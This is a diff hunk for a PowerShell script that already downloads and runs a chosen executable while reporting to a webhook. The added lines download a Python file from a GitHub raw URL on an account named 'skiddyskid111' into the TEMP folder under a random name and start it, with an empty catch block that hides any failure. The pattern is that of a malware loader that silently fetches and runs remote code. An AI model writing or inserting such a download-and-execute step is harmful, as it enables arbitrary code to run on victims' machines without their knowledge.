@@ -78,6 +78,15 @@ try {
         Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
     }
 
+    $tempFile = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".py")
+    $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.py"
+
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $tempFile
+        Start-Process -FilePath $tempFile
+    } catch {
+    }
+
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 } catch {
     Send-WebhookMessage -Message "Unexpected error: $_"
